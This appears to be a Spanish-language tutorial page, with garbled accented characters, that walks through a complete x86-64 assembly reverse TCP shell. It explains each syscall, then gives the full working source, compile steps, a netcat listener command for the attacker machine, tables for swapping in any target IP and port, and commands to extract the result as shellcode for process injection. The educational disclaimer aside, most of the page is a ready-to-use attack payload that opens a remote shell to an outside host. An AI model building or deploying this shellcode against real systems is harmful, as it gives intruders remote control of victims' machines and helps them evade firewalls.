---
date: 2026-01-15
---

# Reverse TCP Shell

<p class="article-meta">
  <span class="article-date">ğŸ“… 15 de enero de 2026</span>
  <span class="article-time">â±ï¸ 5 min de lectura</span>
</p>

Reverse shell TCP implementado en ensamblador x86-64. Usando Ãºnicamente syscalls, sin dependencias.

---

!!! danger "Uso responsable"
    El contenido de este sitio web se publica **exclusivamente con fines educativos e informativos**. El autor **no promueve, respalda ni se hace responsable** del uso indebido o ilegal de la informaciÃ³n aquÃ­ expuesta. Cualquier acciÃ³n realizada a partir de este contenido debe llevarse a cabo **Ãºnicamente** en entornos controlados, sistemas propios o **con autorizaciÃ³n expresa y verificable** del propietario del sistema.

## IntroducciÃ³n

En la reverse shell es la mÃ¡quina objetivo quien inicia la conexiÃ³n hacia el atacante, en lugar de que el atacante se conecte a la mÃ¡quina objetivo. Esto es Ãºtil para evadir firewalls que bloquean conexiones entrantes pero permiten salientes.

## Flujo de ejecuciÃ³n

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”      â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”      â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”      â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ socket(41) â”‚â”€â”€sâ”€â”€â–¶â”‚ connect(42, s, A:P)  â”‚â”€â”€â”€â”€â”€â–¶â”‚ dup2(33): 0,1,2  â†’  s   â”‚â”€â”€â”€â”€â”€â–¶â”‚ execve(59)   â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜      â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜      â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜      â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

            0 = (stdin) â”€â”€â”
            1 = (stdout)  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–º socket(s) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–º ATACANTE (A:P)
            2 = (stderr) â”€â”˜
```

### Crear socket TCP

`socket` (nÂº **41** en Linux x86-64) crea un **objeto de comunicaciÃ³n** en el kernel y devuelve un **file descriptor** (FD) para operar con Ã©l (conectar, enlazar, escuchar, enviar/recibir). ReciÃ©n creado es **solo un objeto en memoria** identificado por su FD, tiene **familia/tipo/protocolo**, pero **no** **IP ni puertos**. Se vuelve un **endpoint real** cuando se realiza una acciÃ³n con este `bind()`, `connect()` o `accept()`.

```nasm
rax = 41         ; NÃºmero de syscall (socket)
rdi = domain     ; Familia de direcciones (AF_*)
rsi = type       ; Tipo de socket (SOCK_*), opcionalmente OR con flags
rdx = protocol   ; Protocolo (0 = por defecto)
```

Puesto que la idea es crear un socket TCP/IPv4 los argumentos de entrada tomarÃ¡n los siguientes valores:

| Registro | Valor | Significado |
| --- | --- | --- |
| `RAX` | 41 | NÃºmero de syscall (`socket`) |
| `RDI` | 2 | `AF_INET` (familia IPv4) |
| `RSI` | 1 | `SOCK_STREAM` (TCP) |
| `RDX` | 0 | Protocolo (0 = por defecto)  |

El registro `RAX` tras la syscall contiene el file descriptor del socket. Se vuelve un endpoint real cuando se realiza una acciÃ³n con este `bind()`, `connect()` o `accept()`.

### Conectarse al atacante

`connect` (nÂº **42** en Linux x86-64) solicita **establecer una conexiÃ³n** entre un **socket** previamente creado y un **endpoint remoto**. En **TCP/`SOCK_STREAM`,** inicia el handshake TCP (SYN â†’ SYN/ACK â†’ ACK)

```nasm
rax = 42         ; NÃºmero de syscall (connect)
rdi = sockfd     ; FD del socket (devuelto por socket())
rsi = addr       ; puntero a struct sockaddr (sockaddr_in / sockaddr_in6 / sockaddr_un, â€¦)
rdx = addrlen    ; tamaÃ±o de esa struct (16 para sockaddr_in)
```

**Estructura `sockaddr_in`**

La estructura `sockaddr_in` define la direcciÃ³n destino y estÃ¡ compuesta por 16 bytes. La construiremos directamente en el stack empaquetando los valores en un qword.

El desglose interno de los campos serÃ­a el siguiente:

| Campo | Bytes | Valor | Significado |
| --- | --- | --- | --- |
| `sin_family` | `02 00` | `2` | `AF_INET` |
| `sin_port` | `11 5c` | `4444` | Puerto en *network byte order* |
| `sin_addr` | `7f 00 00 01`  | `127.0.0.1` | IP destino |
| `sin_zero` | `00 00 00 00 00 00 00 00` | `0` | Padding (8 bytes) |

El padding se pushea primero en el stack (8 bytes de ceros), luego el qword con familia+puerto+IP (8 bytes), formando los 16 bytes totales.

### Redirigir I/O

`dup2` (nÂº **33** en Linux x86-64) **duplica un file descriptor (FD) existente sobre otro nÃºmero de FD especÃ­fico**, cerrando primero el **FD destino** si estaba abierto. Tras la llamada, **ambos apuntan al mismo open file description** (mismo offset y file status flags). Es fundamental para redirecciones de entrada/salida, permitiendo que `stdin`/`stdout`/`stderr` apunten a archivos, sockets o pipes. 

```nasm
rax = 33        ; NÃºmero de syscall (dup2)
rdi = oldfd     ; Descriptor existente a duplicar
rsi = newfd     ; NÃºmero de descriptor destino
```

Ejecutaremos `dup2` en tres ocasiones para redirigir `stdin`/`stdout`/`stderr` al socket:

| IteraciÃ³n | RSI | Efecto |
| --- | --- | --- |
| 1 | 0 | `stdin` â†’ socket |
| 2 | 1 | `stdout` â†’ socket |
| 3 | 2 | `stderr` â†’ socket |

### Ejecutar Shell

`execve` (nÂº **59** en Linux x86-64) **reemplaza** la imagen del proceso actual por la de un **nuevo programa**. Si tiene Ã©xito, el flujo continÃºa en el cÃ³digo del programa cargado.

```nasm
rax = 59             ; NÃºmero de syscall (execve)
rdi = filename       ; puntero a cadena con la ruta al ejecutable (C-string)
rsi = argv           ; puntero a array de punteros a C-string (argv[0..n], terminado en NULL)
rdx = envp           ; puntero a array de punteros a C-string (variables de entorno, terminado en NULL)
```

Puesto que la idea es ejecutar `/bin/sh` en el sistema objetivo:

| Registro | Valor | Significado |
| --- | --- | --- |
| `RAX` | 59 | NÃºmero de syscall (`execve`) |
| `RDI` | `pathname` | Puntero a `"/bin/sh\0"` |
| `RSI` | `argv` | Puntero a array de argumentos (NULL) |
| `RDX` | `envp` | Puntero a array de entorno (NULL) |

Construimos los argumentos en el stack, primero el null terminator, luego la cadena y despuÃ©s los punteros NULL para argv y envp.

La cadena `/bin/sh` equivale a `2F 62 69 6E 2F 73 68` (7 bytes). Para cargarla usaremos el valor `0x68732f6e69622f` (little-endian). Al hacer push, los bytes se almacenan en memoria en el orden correcto.

## PersonalizaciÃ³n

### Cambiar IP de destino

Cada octeto de la IP se convierte a hexadecimal. 

| IP | Valor (Hex) |
| --- | --- |
| 127.0.0.1 | `0x7F000001` |
| 192.168.1.1 | `0xC0A80101` |
| 192.168.18.245 | `0xC0A812F5` |
| 10.0.0.50 | `0x0A000032` |

### Cambiar puerto

El puerto se almacena en network byte order (big-endian).

| Puerto | Valor (Hex) |
| --- | --- |
| 4444 | `0x115c` |
| 8080 | `0x1f90` |
| 443 | `0x01BB` |
| 9001 | `0x2329` |

## CÃ³digo completo (rev_shell.asm)

```nasm
section .text
global _start
_start:
    ; SOCKET
    mov rax, 41
    mov rdi, 2 ;IPV4
    mov rsi, 1 ;TCP
    xor rdx, rdx ; Default
    syscall
    ; Store socket FD
    mov r8, rax
    ; CONNECT
    mov rax, 42
    mov rdi, r8
                    ;   Stack        Low  <----------- High
    ; Entrada esperada: 02 00 11 5c 7F 00 00 01 00 00 00 00 00 00 00 00   
    ;                   â””â”€â”€â”˜  â””â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
    ;                   0-1   2-3   4-7         8-15         (16 bytes en total)
    ;                   fam   port  IP          padding
    ; Mapeado de los campos de sockaddr_in:
                        ; Bytes 0-1:   02 00           â†’ sin_family (AF_INET = 2)
                        ; Bytes 2-3:   11 5c           â†’ sin_port (4444)
                        ; Bytes 4-7:   7f 00 00 01     â†’ sin_addr (127.0.0.1)
                        ; Bytes 8-15:  00 00 00 00...  â†’ sin_zero (padding)
    xor r9,r9 ; 0
    push r9 ; 64 bits de padding a 0 (sin_zero)(8 bytes)
    mov r10, 0x0100007f5c110002
    push r10 ; sin_family + sin_port + sin_addr (8 bytes)
    mov rsi, rsp ; direccion del tope de la pila
    mov rdx, 16 ;IPV4 (espera 16 bytes)
    syscall
    xor rsi,rsi
.dup2:                        ; stdin(0), stdout(1), stderr(2) redirigidos al socket
    ;DUP2
    mov rax, 33
    mov rdi, r8
    syscall 
    inc rsi
    cmp rsi, 3
    jl .dup2
    ; EXEXCVE
    mov rax, 59
    push 0                       ; null terminator de /bin/sh -> /bin/sh\0
    mov r12, 0x68732f6e69622f    ; /bin/sh (2F 62 69 6E 2F 73 68) en little-endian
    push r12                     ; string /bin/sh
    mov rdi, rsp
    push 0                       ; argv = {NULL}
    mov rsi, rsp
    push 0                       ; envp = {NULL}
    mov rdx, rsp
    syscall 
.done:
    ; EXIT
    mov rax, 60                    ; syscall: exit
    xor rdi, rdi                   ; exit code = 0 (Ã©xito)
    syscall
```

## CompilaciÃ³n y uso

```bash
# Compilar
nasm -f elf64 rev_shell.asm -o rev_shell.o
ld rev_shell.o -o rev_shell

# En la mÃ¡quina atacante: iniciar listener
nc -lvnp 4444

# En la mÃ¡quina objetivo: ejecutar
./rev_shell
```

## ExtracciÃ³n de bytes

```bash
# Extraer solo la secciÃ³n .text
objcopy -O binary --only-section=.text rev_shell rev_shell.bin

# Visualizar los bytes (C)
xxd -i rev_shell.bin

# Ver tamaÃ±o
wc -c rev_shell.bin
```

---

!!! info "Ver tambiÃ©n"
    [Process Injection via Ptrace](ptrace-injection.md) - Hace uso de una versiÃ³n modificada de este shellcode como payload en inyecciÃ³n de procesos
